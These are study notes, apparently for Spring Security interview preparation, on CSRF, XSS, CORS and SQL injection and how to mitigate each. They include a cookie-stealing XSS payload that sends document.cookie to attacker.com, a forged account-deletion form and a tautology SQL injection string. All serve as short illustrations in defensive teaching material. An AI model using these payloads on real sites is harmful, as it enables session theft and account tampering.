1Ô∏è‚É£ CSRF (Cross-Site Request Forgery)

üß® What is CSRF?

  • Stateful attack exploiting authenticated sessions.
  • Browser automatically sends stored cookies with every request, including malicious ones.
  • A user is tricked into clicking a malicious link (e.g., <form> or <img>), unknowingly performing an action.

üí£ Attack Flow:

  1. User logs in to a trusted site and gets authenticated (with session cookie).
  1. Attacker sends a link like: 
    <form action="https://trusted.com/deleteAccount" method="POST">
   <input type="submit" value="Claim Your Prize">
</form>
  1. Clicking the link submits request with the user's valid session cookie ‚Üí unwanted operation.

‚úÖ Spring Security Protection:

  • CSRF Token: Generated and stored in session.
  • Only requests from the legitimate frontend carry the valid token.
  • Server validates token before processing.
// Enabled by default in Spring Security for browser clients
http.csrf().enable();  // or use with().csrfTokenRepository(...)

2Ô∏è‚É£ XSS (Cross-Site Scripting)

üß® What is XSS?

  • Attacker injects malicious scripts into web pages viewed by other users.
  • Ex: <script>alert("XSS")</script> or stealing session cookies: 
    <script>fetch('http://attacker.com/steal?c=' + document.cookie);</script>

üí£ Demo:

  • POST /comment: saves user comment without validation.
  • GET /xss: loads all comments, renders in HTML.
  • Attacker posts malicious script ‚Üí auto-runs on page load.

‚úÖ Mitigation:

  • Escape HTML characters like <, >, &, ".
  • Use Spring‚Äôs Thymeleaf, HtmlUtils, or libraries like OWASP Java Encoder.
  • Always validate/sanitize user input.
<!-- In Thymeleaf -->
<span th:text="${comment}"></span> <!-- Escaped -->

3Ô∏è‚É£ CORS (Cross-Origin Resource Sharing)

‚ùì What is CORS?

  • Browser security feature, not a vulnerability.
  • Restricts web apps from making requests to a different origin unless server allows.

üîç Origin = Protocol + Host + Port

Client Origin Server Origin Same Origin?
https://localhost:8080 http://localhost:8080 ‚ùå No
https://localhost:8080 https://localhost:9090 ‚ùå No
http://localhost:8080 http://localhost:8080 ‚úÖ Yes

‚úÖ How to Allow Cross-Origin in Spring Boot:

// Global configuration
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedOrigins("https://localhost:3000")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowCredentials(true);
    }
}

// Or using Spring Security
http.cors();

4Ô∏è‚É£ SQL Injection

üß® What is SQL Injection?

  • Attacker injects malicious SQL via input field: 
    SELECT * FROM users WHERE name = '' OR '1'='1'

‚úÖ Protection Strategy:

  • Always use parameterized queries or JPQL, JPA Criteria API, or Spring Data methods.
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);
‚ùå Never concatenate user input directly into SQL query.

üí¨ Interview Questions

Q1. What is CSRF and how do you prevent it in Spring?

CSRF is a session-hijack-based attack. Spring adds a CSRF token to each form and validates it on the server.

Q2. How does XSS attack work? How to prevent it?

It injects script code in rendered HTML. Use escaping and validation.

Q3. What is CORS? Is it an attack?

No. It‚Äôs a browser feature to prevent unauthorized cross-origin calls. Needs explicit server-side allowance.

Q4. Can Spring Security prevent SQL injection?

Not directly. But using Spring Data repositories and parameterized queries prevents it.
